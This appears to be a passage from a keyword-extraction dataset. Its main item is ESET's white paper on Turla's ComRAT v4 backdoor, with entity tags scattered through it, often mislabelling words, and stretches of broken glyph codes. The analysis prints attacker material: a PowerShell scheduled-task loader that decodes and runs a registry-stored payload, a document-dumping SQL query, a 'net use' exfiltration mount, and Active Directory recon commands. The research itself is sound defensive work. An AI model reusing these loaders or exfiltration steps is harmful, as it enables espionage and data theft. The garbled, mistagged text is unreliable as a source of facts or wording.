The malware has been observed in previous attacks leveraging vulnerabilities in F5 BIG-IP and Sophos Firewall. The article provides technical details of the malware's behavior and execution flow, including changes made by the attackers. The GoMet dropper creates fake Windows update scheduled tasks for persistence and replaces autorun values instead of creating new ones. The article emphasizes the importance of patching vulnerabilities and implementing strong security measures to mitigate these types of attacks."]}, {"split_name": "val", "sample_id": "val_85", "prompt_text": "Extract the keywords: ESET Research White Paper // [DATE] May [DATE] 2020FROM AGENT.BTZ TO COMRAT V4A [DATE] ten [DATE] - year journeyMatthieu FaouTABLE OF CONTENTS LIST OF TABLES Table 1List of backdoor commands in ComRAT v419LIST OF FIGURES Figure [CARDINAL] 4Timeline of important attacks attributed to Turla 5 ComRAT v4 [ORG] PDB path [PRODUCT] 7 [PRODUCT] Timeline [PRODUCT] of [PRODUCT] ComRAT 7 [ORG] SQL command to dump documents from the central database ( partially redacted ) [ORG] 8 [ORG] Command to mount a [ORG] OneDrive folder using net use ( partially redacted ) [CARDINAL] 8 Figure [CARDINAL] 5 Basic recon of the compromised machine [CARDINAL] 8 Figure [CARDINAL] 6 [PERSON] Turla operators [TIME] \u2019 [TIME] working [TIME] hours [TIME] 9 Figure 7 Injection of the orchestrator into the [ORG] Explorer process 10 Figure 8 Screenshot of ComRAT v4 [CARDINAL] 64 - bit orchestrator [ORG] DLL in [GPE] Detect It Easy 10 Figure [CARDINAL] 9 Summary of ComRAT architecture [CARDINAL] 11 Figure [CARDINAL] 10 Figure [TIME] 11 [TIME] Business [TIME] hours check 12 Figure [CARDINAL] 12 Example of Abstract Factory method pattern [CARDINAL] 12 Figure [CARDINAL] 13 Example of Adapter pattern [CARDINAL] 12 Figure [CARDINAL] 14 Example of Mediator pattern [CARDINAL] 12 Figure [CARDINAL] 15 [ORDINAL] First bytes of the decrypted FAT16 [ORG] Virtual [ORG] File [ORG] System [ORG] 13 Figure [CARDINAL] 16 [ORG] Virtual [ORG] File [ORG] System hierarchy [CARDINAL] 14 Figure [CARDINAL] 17 Content of /etc / transport / legacy / get.list 14 Figure [CARDINAL] 18 Generation of the pipe name [CARDINAL] 15 Figure [CARDINAL] 19 Overview of the email [ORG] C&C mode [CARDINAL] 16 Figure [CARDINAL] 20 Contents of /etc / transport / mail / mailboxes/0 / cookie.str(partially redacted ) [CARDINAL] 16 Figure [CARDINAL] 21 Example of the [PERSON] Gmail simplified HTML view ( for demonstration purpose only ) [CARDINAL] 17 Figure [CARDINAL] 22 Contents of /etc / transport / mail / service / subject [CARDINAL] 17 Figure [CARDINAL] 23 Email from the [PERSON] Gmail inbox that contains commands in the attachment ( partially redacted and opened in [ORG] Microsoft [ORG] Outlook for demonstration purposes only ) [CARDINAL] 17 Figure [CARDINAL] 24 Decrypted attachment [CARDINAL] 18 Figure [CARDINAL] 25 Email sent by ComRAT to the operators \u2019 email address(partially redacted and opened in [ORG] Microsoft [ORG] Outlook for demonstration purposes only ) [DATE] 1941 . EXECUTIVE SUMMARY [GPE] Turla , also known as Snake , is one of oldest cyberespionage groups still active , with [DATE] more [DATE] than [DATE] a [DATE] decade of experience . Its operators mainly focus on high - profile targets such as governments and diplomatic entities in [LOC] Europe , [LOC] Central [LOC] Asia and [LOC] the [LOC] Middle [LOC] East . They are known for having breached major organizations such as [ORG] the [ORG] US [ORG] Department [ORG] of [ORG] Defense in 2008 and the [NORP] Swiss defense company RUAG in [DATE] 2014 . More recently , several [NORP] European countries including [GPE] France and [GPE] the [GPE] Czech [GPE] Republic went public to denounce [ORG] Turla \u2019s attacks against their governments . To perform these operations , [ORG] Turla \u2019s operators maintain a large arsenal of malware including a rootkit , several complex backdoors aimed at different platforms , including [ORG] Microsoft [ORG] Exchange mail servers , and a large range of tools to enable pivoting on a network . In this white paper , we present our analysis of the latest version of [CARDINAL] one their oldest backdoors , publicly known as ComRAT . Key points in this white paper:\u2022 [GPE] Turla has used ComRAT since at least 2007 . \u2022 ComRAT v4 was [ORDINAL] first seen in [DATE] 2017 and known still to be in use as recently as [DATE] January [DATE] 2020 . \u2022 We identified [CARDINAL] at [CARDINAL] least [CARDINAL] three targets : [CARDINAL] two [ORG] Ministries [ORG] of [ORG] Foreign [ORG] Affairs and a national parliament . \u2022 ComRAT was used to exfiltrate sensitive documents . The operators used public cloud servicessuch as [ORG] OneDrive and [CARDINAL] 4shared to exfiltrate data.\u2022 ComRAT is a complex backdoor developed in [LANGUAGE] C++ . \u2022 ComRAT uses a [ORG] Virtual [ORG] File [ORG] System formatted in FAT16 . \u2022 ComRAT is deployed using existing access methods , such as the PowerStallion PowerShell backdoor [ 1 ] . \u2022 ComRAT has [CARDINAL] two [ORG] Command and Control channels\u2022 HTTP : It uses exactly the same protocol as ComRAT v3 \u2022 Email : It uses the [PERSON] Gmail web UI to receive commands and exfiltrate data\u2022 ComRAT can perform many actions on the compromised computers , such as executing additionalprograms or exfiltrating files.52 . TURLA PROFILE [PERSON] Turla , also known as Snake , is an infamous espionage group active for [DATE] at [DATE] least [DATE] a [DATE] decade . The group is well known for its advanced custom tools and its ability to run highly targeted operations.2.1 Publicized high - profile attacks Over [DATE] the [DATE] past [DATE] ten [DATE] years , [GPE] Turla has been responsible for numerous high - profile breaches . The targets include [ORG] the [ORG] United [ORG] States [ORG] Central [ORG] Command in [DATE] 2008 [ [CARDINAL] 2 ] , [ORG] the [ORG] Finnish [ORG] Ministry [ORG] of [ORG] Foreign [ORG] Affairs in [DATE] 2013 [ [CARDINAL] 3 ] , the [NORP] Swiss military company RUAG in [DATE] 2014 [ [CARDINAL] 4 ] and [ORG] the [ORG] German [ORG] Foreign [ORG] Office in [DATE] 2017 [ 5 ] . More recently , they allegedly compromised [ORG] the [ORG] French [ORG] Armed [ORG] Forces in [DATE] 2018 [ [CARDINAL] 6 ] and [ORG] the [ORG] Austrian [ORG] Foreign [ORG] Ministry in [DATE] 2019 [ [CARDINAL] 7 ] . The timeline in Figure [CARDINAL] 1 presents some of the major attacks attributed to Turla.(cid:31)(cid:30)(cid:30)8(cid:31)(cid:30)(cid:29)(cid:27)(cid:31)(cid:30)(cid:29)(cid:26)US Central CommandFinnish Foreign MinistryRUAG defense company(cid:31)(cid:30)(cid:29)(cid:25)German Foreign O(cid:4)ce(cid:31)(cid:30)(cid:29)(cid:24)(cid:31)(cid:30)(cid:29)8Austrian Foreign MinistryFrench Armed ForcesFigure 1 // Timeline of important attacks attributed to [ORG] Turla2.2 [ORG] Victimology [ORG] As opposed to some other [ORG] APT ( Advanced Persistent Threat ) groups , [GPE] Turla is far from being opportunistic in the selection of its targets . The group is interested in collecting information from strategic organizations . In addition , to our knowledge , [GPE] Turla has never conducted cybersabotage operations , such as those made by [ORG] GreyEnergy [ [CARDINAL] 8 ] or [ORG] TeleBots [ 9].With [DATE] several [DATE] years of experience tracking this espionage group , we have identified the most at - risk types of organizations:\u2022 [ORG] Ministries [ORG] of [ORG] Foreign [ORG] Affairs and diplomatic representations ( embassies , consulates , etc . ) \u2022 Military organizations \u2022 [LOC] Regional political organizations \u2022 [ORG] Defense contractorsOther [ORG] APT groups might also be targets of interest for [GPE] Turla . In [DATE] June [DATE] 2019 , [NORP] Symantec reported [ [CARDINAL] 10 ] that [PERSON] Turla had hijacked OilRig infrastructure and used it to drop its own malware onto existing OilRig victims \u2019 networks . According to our telemetry and public information , [GPE] Turla seems to target organizations in most parts of the world . Moreover , over [DATE] the [DATE] past [DATE] few [DATE] years , we have noticed that geographical areas of conflict , such as [LOC] Eastern [LOC] Europe and [LOC] the [LOC] Middle [LOC] East , are under heavy attack from this [ORG] APT group . However , even with this recent focus , it has not abandoned its traditional targets in [LOC] Western [LOC] Europe and Central Asia.62.3 Tools and tactics The usual modus operandi of [GPE] Turla \u2019s operators is to use basic [ORDINAL] first - stage malware for initial reconnaissance . In some cases they even use generic tools such as [GPE] Metasploit [ 11 ] [ [CARDINAL] 12 ] . If they deem a victim interesting enough , they switch to more advanced malware such as Carbon [ 13 ] or Gazer [ 14].The initial compromise is generally tailored towards specific types of victims . They mainly rely on spearphishing emails [ [CARDINAL] 15 ] , watering hole attacks [ [CARDINAL] 16 ] [ [CARDINAL] 17 ] or Man - in - the - Middle attacks [ 18].After this initial compromise step , they move laterally on the network and collect credentials . To avoid suspicious communications to the internet , they developed tools such as [ORG] DarkNeuron [ [CARDINAL] 19 ] and [ORG] RPC [ORG] Backdoor [ 1 ] , to forward commands and exfiltrate data from the local network . They also regularly create user accounts that they use later if they lose access to a compromised machine . This all means that once compromised , it is very hard to eject the attacker from the network without rebuilding most of it . Finally , collected data are exfiltrated through various channels such as HTTP , email or cloud storage . [ORG] Turla \u2019s operators usually rely on compromised web servers for the [ORDINAL] first [ORG] C&C level . They are also known for using [ORG] Cloudflare and [ORG] SATCOM [ORG] IP addresses to hide the real destination of this traffic [ [CARDINAL] 20].Turla \u2019s operators have at their disposal a wide arsenal of malware tools for all major desktop platforms : Windows , macOS and Linux . Some of these tools stand out for their complexity , such as the Snake rootkit , which relies on a vulnerable [ORG] VirtualBox driver to bypass [ORG] Windows [ORG] Driver [ORG] Signature [ORG] Enforcement [ [CARDINAL] 21 ] . Some others stand out for their originality , such as the Outlook backdoor we analyzed in [DATE] 2018 [ [CARDINAL] 22 ] or [ORG] LightNeuron , a backdoor targeting [ORG] Microsoft [ORG] Exchange [ 23].During our [DATE] several [DATE] years of tracking [ORG] Turla \u2019s activities , we have also noticed that its operators react quickly to both detection and publication . Apparently , they do not hesitate to remove their tools and clean some artefacts such as malware logs , and potentially lose control of a machine , if they feel they will be detected soon . They probably do not want their more - advanced malware to be exposed publicly.3 . OVERVIEW3.1 From Agent . BTZ to ComRAT v4 Agent . [ORG] BTZ is a Remote Access Trojan ( RAT ) that became infamous after its use in a breach of the [GPE] US military in [DATE] 2008 [ [CARDINAL] 24 ] . The [ORDINAL] first version of this malware , seen in [DATE] 2007 , exhibited worm capabilities by spreading through removable drives . Later , this malware family , along with other families such as the Snake rootkit , was attributed to an [ORG] APT group dubbed [GPE] Turla . From 2007 to 2012 , [CARDINAL] two new major versions of the [ORG] RAT , later named ComRAT , were released as described by [ORG] G [ORG] DATA [ [CARDINAL] 25 ] . Interestingly , both employed the well - known [PERSON] Turla [PERSON] XOR key:1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6 gs923HL34x2f5cvd0fk6c1a0sThen , and until [DATE] mid-2017 , [GPE] Turla developers made a few changes to ComRAT but it was still using a very similar code base . In [DATE] 2017 , we noticed that a very different version of ComRAT was released . As shown in Figure [CARDINAL] 2 , it is version [CARDINAL] 4 of a malware family its authors dubbed [NORP] Chinch . It was also the internal name the developers used for the previous versions.7Figure [CARDINAL] 2 // ComRAT v4 [ORG] PDB pathThis new version uses a completely new code base and is far more complex than its predecessors . It takes some inspiration from Snake , the rootkit used by [PERSON] Turla with , for instance , a [ORG] Virtual [ORG] File [ORG] System formatted in FAT16 . Figure [CARDINAL] 3 provides an overview of ComRAT history.(cid:31)(cid:30)(cid:30)(cid:28)(cid:31)(cid:30)(cid:30)(cid:26)(cid:31)(cid:30)(cid:30)(cid:26)ComRAT v(cid:12 ) releaseBreach at the [GPE] US military using ComRATComRAT v(cid:1 ) release(cid:31)(cid:30)(cid:27)(cid:30)(cid:31)(cid:30)(cid:29)(cid:28)(cid:31)(cid:30)(cid:29)(cid:28)ComRAT v(cid:8 ) use still [PERSON] continuingComRAT [PERSON] v(cid:8 ) releaseLast known ComRAT [GPE] v(cid:16 ) activityFigure [CARDINAL] 3 // Timeline of ComRAT(cid:31)(cid:30)(cid:29)(cid:27)ComRAT v(cid:16 ) release3.2 Targeting During our investigation , we were able to identify [CARDINAL] three different targets where ComRAT v4 has been used:\u2022 [CARDINAL] Two Ministries of Foreign Affairs in [LOC] Eastern [LOC] Europe \u2022 [CARDINAL] One national parliament in the Caucasus regionThis targeting is in - line with other campaigns we described in the past.3.3 Attribution to Turla Based on the victimology and the TTPs , we believe that ComRAT is used exclusively by a single [ORG] APT group . Moreover , there are a few elements linking ComRAT v4 to [PERSON] Turla : It uses the same internal name , [PERSON] Chinch , as the previous versions It uses the same custom [ORG] C&C protocol over [ORG] HTTP as ComRAT v3 \u2022 A part of the network infrastructure is shared with [PERSON] Mosquito [ [CARDINAL] 18 ] It was dropped by , or has dropped other , [GPE] Turla malware families : \u2022 \u2022 A [ORG] PowerShell loader [ 1 ] \u2022 The PowerStallion backdoor [ 1 ] \u2022 [ORG] The [ORG] RPC [ORG] Backdoor [ 1]Therefore , we believe that the ComRAT v4 malware family is part of the [GPE] Turla arsenal . Insight into attacker \u2019s activity3.4 During our investigation , we were able to get insights about what [GPE] Turla operators were doing on the compromised machines . The main use of ComRAT is discovering , stealing and exfiltrating confidential documents . In [CARDINAL] one case , its operators even deployed a .NET executable to interact with the victim \u2019s central MS [ORG] SQL [ORG] Server database containing the organization \u2019s documents . Figure [CARDINAL] 4 is the redacted [ORG] SQL command.8sqlCommand . CommandText = \u201c select top \u201c + num2.ToString ( ) + \u201c filename , img , [PERSON] datalength(img ) , i d from < Redacted > with(nolock ) where not img is null and i d > \u201d + num4 . ToString ( ) ; [ORG] sqlCommand . CommandText + = \u201c and [CARDINAL] datalength(img)<1500000 and ( filename like \u2018 % .doc \u2019 or filename like \u2018 % .docx \u2019 or filename like \u2018 [ 0 - 9][0 - 9][0 - 9][0 - 9][0 - 9][0 - 9][0 - 9][0 - 9]%.pdf \u2019 or ( filename like \u2018 3%.pdf \u2019 and len(filename)>9 ) ) \u201d ; [ORG] sqlCommand . CommandText + = \u201c order by id\u201d;Figure [CARDINAL] 4 // [ORG] SQL command to dump documents from the central database ( partially redacted)These documents were then compressed and exfiltrated to a cloud storage provider such as [ORG] OneDrive or [CARDINAL] 4shared . Cloud storage is mounted using the net use command as shown in Figure [CARDINAL] 5.tracert -h 10 yahoo.com net use url < redacted password > /u:<redacted>@aol.co.uk tracert -h 10 yahoo.comFigure 5 // Command to mount a [ORG] OneDrive folder using net use ( partially redacted)In addition to document stealing , the operators also run many commands to gather information about [ORG] the [ORG] Active [ORG] Directory groups or users , the network or [ORG] Microsoft [PRODUCT] Windows configurations such as the group policies . Figure [CARDINAL] 6 is a list of commands executed by [PERSON] Turla [PERSON] operators.gpresult /z net view /domain net user administrator net user /domain net group net group /domain net localgroup Administrators net group \u201c Domain Computers \u201d /domain net group \u201c [WORK_OF_ART] Domain [WORK_OF_ART] Admins \u201d /domain net group \u201c Domain Controllers \u201d /domain dir \u201c % programfiles% \u201d net group \u201c [WORK_OF_ART] Exchange [WORK_OF_ART] Servers \u201d /domain net accounts net accounts /domain ipconfig /displaydnsFigure [CARDINAL] 6 // Basic recon of the compromised machine9Finally , we also noticed that [GPE] Turla operators are aware of and try to evade security software . For instance , they regularly exfiltrate security - related log files in order to understand whether their malware samples have been detected . This shows the level of sophistication of this group and its intention to stay on the same machines for a long time . We also extracted the times at which [PERSON] Gmail received the emails sent by the operators , which should be very close to the time at which commands were sent by the operators through the email [ORG] C&C channel . We believe this is a good metric because the emails are later processed by the backdoor . Thus , it shows the time at which the operators were working and not the time at which the infected computer executed malicious commands . Figure [CARDINAL] 7 represents [DATE] the [DATE] time [DATE] of [DATE] day that commands were sent , in a [DATE] one [DATE] - month period . Given the distribution , it is likely that the operators are working in the [ORG] UTC+3 or UTC+4 time [DATE] zone.(cid:29)(cid:31)(cid:25)(cid:31)(cid:30)(cid:31)(cid:31)Number of emails receivedUTC timezoneUTC+(cid:27 ) timezone(cid:31)(cid:30)(cid:29)(cid:28)(cid:27)(cid:26)(cid:31)(cid:26)(cid:30)(cid:26)(cid:29)(cid:26)(cid:28)(cid:26)(cid:27)(cid:30)(cid:31)(cid:30)(cid:30)HourFigure 7 // [PERSON] Turla operators \u2019 working hours4 . COMRAT V4 According to its compilation timestamp , which is likely genuine , the [ORDINAL] first known sample of ComRAT v4 was compiled in [DATE] April [DATE] 2017 . The most recent iteration of the backdoor was , to the best of our knowledge , compiled in [DATE] November [DATE] 2019 . In this section , we will describe a sample compiled in [DATE] March [DATE] 2019 , but it is very similar to the latest version . Installation and persistence4.1 Based on ESET telemetry , we believe that ComRAT is installed using an existing foothold such as compromised credentials or via another [GPE] Turla backdoor . For instance , we \u2019ve seen ComRAT installed by [ORG] PowerStallion , a [ORG] PowerShell - based backdoor we described in [DATE] 2019 [ 1].The ComRAT installer is a [ORG] PowerShell script that creates a [PRODUCT] Windows scheduled task and fills a registry value with the encrypted payload . The registry value is usually HKLM\\SOFTWARE\\Microsoft\\SQMClient\\Windows . WSqmCons10The Windows task is usually in C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\ Customer Experience Improvement Program\\Consolidator and contains the following command:<Exec><Command > cmd.exe</Command > < Arguments>/c \u201c % SystemRoot%\\System32\\wsqmcons.exe & amp ; powershell.<Actions Context=\u201dWinSQMAccount \u201d > exe -v 2 \u201c $ [MONEY] QAY076ai = \u2018 AKWC;HUA389933tomasoas\u2019;[Text . Encoding]::ASCII . GetString([Convert]::\\\u201dFr`omBa`se6`4Str`ing\\\u201d((gp HKLM:\\SOFTWARE\\Microsoft\\SQMClient\\ Windows).WSqmCons))|iex;\u201d\u201d</Arguments > < /Actions > Note that the password used to decrypt the ComRAT payload is different on each machine . It is interesting to note that while ComRAT \u2019s name is derived from its use of [ORG] COM object hijacking , in this new version the developers no longer use this method for ensuring persistence.4.2 Orchestrator The [ORG] PowerShell loader is executed every time the user logs in . It is very similar to the cluster of loaders we described in [DATE] 2019 [ 1 ] and is based on the [ORG] Invoke - DllInjection loader from the [ORG] PowerSploit framework . It loads the ComRAT orchestrator [ORG] DLL into explorer.exe as shown in Figure 8.Figure 8 // Injection of the orchestrator into the [ORG] Explorer processThis is a [NORP] C++ [ORG] DLL existing in 32- and [CARDINAL] 64 - bit versions . It has [CARDINAL] two exports named [ORG] UMEP and [GPE] VFEP . The [CARDINAL] 64 - bit version is called [PERSON] x64_Release.dll as shown in Figure [DATE] 9.Figure [DATE] 9 // Screenshot of ComRAT v4 [CARDINAL] 64 - bit orchestrator [ORG] DLL in [GPE] Detect It Easy11The orchestrator embeds an encrypted ( [ORG] XORed with a hardcoded key ) communication module ( a 32- or [QUANTITY] 64 [QUANTITY] - bit [ORG] DLL ) that will be injected into the default web browser . The orchestrator interacts with the ComRAT communication module ( described in more detail later ) through a named pipe . Thus , all of the malware \u2019s network communications will be initiated in the browser process , which is stealthier than if it was done directly by the orchestrator . The orchestrator has some interesting features such as a [ORG] Virtual [ORG] File [ORG] System ( VFS ) in FAT16 format , which we describe later , and it can use [PERSON] Gmail to receive commands and to exfiltrate information to the operators . Figure [CARDINAL] 10 is an overview of ComRAT \u2019s architecture . Existing accessto the victim 's computerEx : PowerStallionExecute</>PowerShellscriptWriteCreateEncrypted payload in Windows RegistryWindows task for persistencecommunicationInjectlibraryDefault browserC&C ServerGMAILGmail addressLoad payload in explorer.exeexeOrchestrator runningin explorer.exeHTTP request / responsein a named pipeVirtual [PRODUCT] FAT\u2039\u0152 [PRODUCT] File System>_CommandsEx\ufb01ltrate documents to various cloud servicesNetwork and [ORG] Active [ORG] Directory reconDrop and execute additional malware programsMonitor security logsTurla operatorFigure 10 // Summary of ComRAT architecture12The orchestrator is programmed to sleep outside [TIME] local [TIME] business [TIME] hours ( [DATE] 9 [DATE] to [DATE] 5 , [DATE] Monday [DATE] to [DATE] Friday ) , as shown in Figure [DATE] 11.Figure [DATE] 11 // Business hours check4.3 [WORK_OF_ART] Development [WORK_OF_ART] Our in - depth analysis of this malware family leads us to believe that the ComRAT developers are both experienced and spent time designing the malware architecture . We noticed that they used several design patterns . For example , they use the so - called [ORG] Abstract [ORG] Factory pattern [ [CARDINAL] 26 ] in the code responsible for parsing and creating instructions based on [ORG] C&C communications , as shown in Figure [CARDINAL] 12 . It is interesting to note that it was implemented using a [LANGUAGE] C++ template . Thus , there is a lot of duplicated code in the compiled binary because each templated class or function will have a different implementation for each type it is used with . Figure [CARDINAL] 12 // Example of [ORG] Abstract [ORG] Factory method patternThey also have used other design patterns , such as the Adapter pattern [ [CARDINAL] 27 ] , shown in Figure [CARDINAL] 13 , and the Mediator pattern [ [CARDINAL] 28 ] , shown in Figure 14.Figure 13 // Example of Adapter patternFigure 14 // Example of Mediator patternIt should be noted that , in addition to complex elements such as a FAT16 [ORG] VFS , ComRAT \u2019s developers use some obfuscation . Most of the strings in their binaries are string - stacked and encrypted , with a different key per sample , with the apparent goal of preventing easy detection of this malware family . Finally , they use several [ORDINAL] third - party libraries:\u2022 fat_io_lib : for [ORG] the [ORG] Virtual [ORG] File [ORG] System [ORG] \u2022 [ORG] Gumbo : to parse HTML \u2022 wolfCrypt : for [ORG] C&C data ( en|de)cryptionOverall , it tells us that the [GPE] Turla group tasked experienced developers for this new version of ComRAT . Both the development effort and the technologies used , such as [ORG] the [ORG] Virtual [ORG] File [ORG] System , make it a counterpart of Carbon [ 13 ] and Gazer [ 14].134.4 [ORG] Virtual [ORG] File [ORG] System and configuration All the files related to ComRAT , except the orchestrator [ORG] DLL and scheduled task , are stored in a [ORG] Virtual [ORG] File [ORG] System . This is a regular file stored at [CARDINAL] one of these [PERCENT] locations:\u2022 [PERCENT] % TEMP%\\FXSAPIDebugTrace.txt [PERCENT] \u2022 [PERCENT] % TEMP%\\iecache.bin However , once decrypted , these files are FAT16 partition images , as shown in Figure 15.Figure [CARDINAL] 15 // [ORDINAL] First bytes of the decrypted FAT16 [ORG] Virtual [ORG] File [ORG] SystemThe encryption key is unique per machine , as it is generated during the installation . It uses a variant of [PERSON] Mersenne [PERSON] Twister and takes its seed from std::_Random_device . This 32 [QUANTITY] - byte key is then stored in ( HKLM|HKCU)\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\ { 59031A47 - 3F72 - 44A7 - 80C5 - 5595FE6B30EE}\\Order The [ORG] VFS is encrypted using AES-256 in XTS mode . This mode of operation is a standard for disk encryption . The [ORDINAL] first [CARDINAL] 16 - bytes of the key are used for the block encryption while the last [CARDINAL] 16 - bytes are used to derive the initialization vector from the sector number . The default [ORG] VFS container file is hardcoded in the orchestrator and dropped the [ORDINAL] first time it is executed . Then , most of the files can be updated using backdoor commands . It uses UNIX - like paths so , for example , the log file is located at /var / log / working.c4log . The malware uses a [ORDINAL] third - party library , fat_io_lib , to read the partition . Figure [CARDINAL] 16 is an overview of the files and folders in the [GPE] VFS.14FAT(cid:28)(cid:27 ) [PERSON] Virtual [PERSON] File Systemvarlogworking.c(cid:143)logbin < Executables > [PERSON] Contains log \ufb01lesContains the con\ufb01guration related to [ORG] C&C communicationsProbably contains modules ( cid:14)PE executables(cid:11 ) but we have n\u2019t seen any in the wild . Contains the encryption keys ( cid:14)AES and RSA(cid:11 ) used for the [ORG] C&C communicationsContains backdoor commands that will be executed automatically . For example , /etc / auto_exec / send_log.c4 executes the backdoor command [CARDINAL] 106 : SendWorkingLog . [ORG] Contains commands executed at startup.etctransportmailmailboxes(cid:4)command_addr.str answer_addr.str cookie.strserviceindex.int subject.strlegacyget.list post_fault_count.intservicecurrent_transport.str timeout.intpkiaes_key.pki public_cert.pki id.pkiauto_execsend_log.c(cid:143)init_ddir_set_ipcon\ufb01g.c(cid:143)Figure [CARDINAL] 16 // [PERSON] Virtual [PERSON] File [PERSON] System hierarchyIt is interesting to note that some files use extensions such as c4 or c4log , where c4 most likely stands for Chinch 4 , the internal name of the malware family . By mounting [ORG] the [ORG] Virtual [ORG] File [ORG] System , we get access to all these files . Figure [CARDINAL] 17 is an example of /etc / transport / legacy / [ORG] get.list content . This is a list of [ORG] C&C domains separated with a pipe . Figure [CARDINAL] 17 // Content of /etc / transport / legacy / get.list154.5 [ORG] Command [ORG] & [ORG] Control channels ComRAT v4 has [CARDINAL] two different [ORG] C&C channels : HTTP ( internally known as legacy ) and email ( internally known as mail ) , which uses the [PERSON] Gmail web interface . The mode to be used ( legacy , mail or any ) is specified in the file /etc / transport / service / current_transport.strCommunication module The orchestrator retrieves the default browser , by checking [ORG] HKCR\\http\\shell\\open\\command , and injects the communication [ORG] DLL , either 32- or [QUANTITY] 64 [QUANTITY] - bit , into it . These DLLs are hardcoded in the orchestrator and [ORG] XORed with a static key . This module is quite simple as it is just a \u201c bridge \u201d between the orchestrator and the [ORG] C&C server . The goal is probably to make the malware \u2019s HTTP requests to its [ORG] C&C appear to be from a process that would be expected to connect to the internet and make HTTP requests . The orchestrator uses a named pipe to interact with the communication module . The pipe name is derived from the computer name as shown on Figure [DATE] 18.Figure [DATE] 18 // Generation of the pipe nameThe orchestrator sends [ORG] C&C requests to the communication module , which sends them to the [ORG] C&C server , and that module sends any responses or new commands from the [ORG] C&C server to the orchestrator , using the same pipe . The communication [ORG] DLL is slightly obfuscated , in a very similar way to many other [GPE] Turla malware families . All the strings are string - stacked , some of them [ORG] XORed , and most of the Windows APIs it uses are resolved dynamically . Legacy / HTTP[S ] The most basic [ORG] C&C mode is what the ComRAT developers called legacy mode . Indeed , it is the exact same protocol as implemented in ComRAT v3.x . We believe that it is intended to be compatible with [ORG] C&C servers already in place , avoiding the need to deploy a whole new set of servers . It also gives the operators the flexibility to control old ComRAT instances without the need to upgrade all the victims to version [CARDINAL] 4 . Even if this is an old [ORG] C&C protocol , it was still being used in the wild in [CARDINAL] 2020.Two lists of [ORG] C&C servers are stored in the [ORG] VFS at the paths : /etc / transport / legacy / [PERSON] get.list and /etc / transport / legacy / post.list They generally each contain [CARDINAL] two or [CARDINAL] three different domains , separated with a pipe character . The format of the URL is quite easy to recognize as it has n\u2019t changed for [DATE] years : [PERSON] http[s]://<C&C domain>/index / index.php?h=<base64 XOR key>&d=<base64 [ORG] XORed data > The h parameter contains an [QUANTITY] 8 [QUANTITY] - byte [ORG] XOR key encoded in base64 . It is generated using the rand function seeded by the result of a call to the GetTickCount function . The d parameter contains the base64 - encoded data . It is encrypted using the [LAW] XOR key in the h parameter.16Email The [ORDINAL] second C&C mode is called mail by ComRAT developers . The code is actually very specific to [PERSON] Gmail and we have n\u2019t seen any other version of ComRAT able to use another email provider . A basic overview of the email [ORG] C&C mode is shown Figure [CARDINAL] 19.ComRATRead the email address and the authentication cookies in [ORG] the [ORG] VirtualFile [ORG] SystemConnect to the [PERSON] Gmail web [ORG] UIParse the HTMLof the inboxDownload the emailattachmentsDecrypt each attachmentExecutethe commandsSend the result back by email(cid:25)(cid:24)(cid:23)(cid:22)(cid:21)(cid:20)(cid:19)Sendcommandsby emailControlthe mailboxOperator mailbox(cid:31)often on GMX(cid:21)Turla operatorcommand resultsReceiveby emailFigure 19 // Overview of the email [ORG] C&C modeStep [CARDINAL] 1The orchestrator reads the email address in /etc / transport / mail / mailboxes/0 / command_addr It also reads the cookies to authenticate on [PERSON] Gmail in /etc / transport / mail / mailboxes/0 / cookie These cookies typically have a limited lifetime so they should be updated from time to time . Figure [CARDINAL] 20 is a redacted screenshot of the contents of the cookie file . Figure [CARDINAL] 20 // Contents of /etc / transport / mail / mailboxes/0 / cookie.str ( partially redacted)17Step [CARDINAL] 2It connects to the basic HTML view of [PERSON] Gmail at the URL url google com / mail/?ui = html&zy = g using the cookies described above . An example of such a view is shown Figure 21.Figure [CARDINAL] 21 // Example of the [PERSON] Gmail simplified HTML view(for demonstration purpose only)Step [CARDINAL] 3It parses the inbox HTML page using the [GPE] Gumbo HTML parser in order to extract the list of emails . It will only read emails for which the Subject : is in the list at /etc / transport / mail / service / subject , as shown in Figure [CARDINAL] 22.Figure [CARDINAL] 22 // Contents of /etc / transport / mail / service / subjectThen , for each email , it extracts the link to download the attachment . The attachments are generally masquerading as documents with names such as document.docx and documents.xlsx . The body of the email is generally empty . Figure [CARDINAL] 23 is an example of an email sent by [GPE] Turla operators to a ComRAT [ORG] C&C mailbox . Figure [CARDINAL] 23 // Email from the [PERSON] Gmail inbox that contains commands in the attachment ( partially redacted and opened in [ORG] Microsoft [ORG] Outlook for demonstration purposes only)18Step 4It downloads all the relevant attachments from [PERSON] Gmail . The email is then deleted so that it is not processed a [ORDINAL] second time . Step [CARDINAL] 5Despite their extensions , the attachments are not docx or xslx files . They contain a blob of data in the following format:(cid:31)(cid:30)(cid:29)(cid:28)(cid:28)+n < victim id > CRC(cid:20)(cid:19 ) of the encrypted data(cid:9)x(cid:9)(cid:7)AES(cid:3)encrypteddataThe AES-256 key is stored in the [ORG] VFS in /etc / pki / aes_key and it uses AES in CBC mode with a null initialization vector . Step [CARDINAL] 6Once decrypted , we have access to the backdoor commands and parameters . We provide more details about the backdoor commands in section [CARDINAL] 4.6 . Figure [CARDINAL] 24 is an example of a decrypted email attachment . 0x67 is the ID for \u201c Execute a command with cmd.exe \u201d and it is followed by the command to execute . We believe that the beginning of the decrypted data is filled with random bytes . Figure [CARDINAL] 24 // Decrypted attachmentStep 7The backdoor creates an attachment containing the result of the commands . The attachment name consists of [CARDINAL] 20 random digits and of the .jpg.bfe so - called double extension . Its content has the following format:(cid:31)(cid:30)(cid:29)(cid:28)(cid:27)(cid:26)(cid:25)(cid:27)(cid:26)(cid:25)+n < victim id > CRC(cid:20)(cid:19 ) of the encrypted data(cid:9)x(cid:9)(cid:7)RSA(cid:4)encryptedAES key ( cid:1)+padding(cid:141)AES(cid:4)encrypteddataThe AES key is different for each email as it is randomly generated . Then , it is encrypted using RSA-2048 with the public key stored in /etc / pki / public_cert.pki . The format of the key is quite unusual as it is raw bytes representing the concatenation of n and e. [PERSON] Turla \u2019s developers did not implement the [ORG] RSA encryption themselves ; they used code from the wolfSSL library and more specifically from a commit before [DATE] March [DATE] 2016.19Finally , and using the [PERSON] Gmail web interface as before , the backdoor sends the email to the address contained in /etc / transport / mail / mailboxes/0 / answer_addr . This address is typically not hosted on [PERSON] Gmail but rather on [ORG] 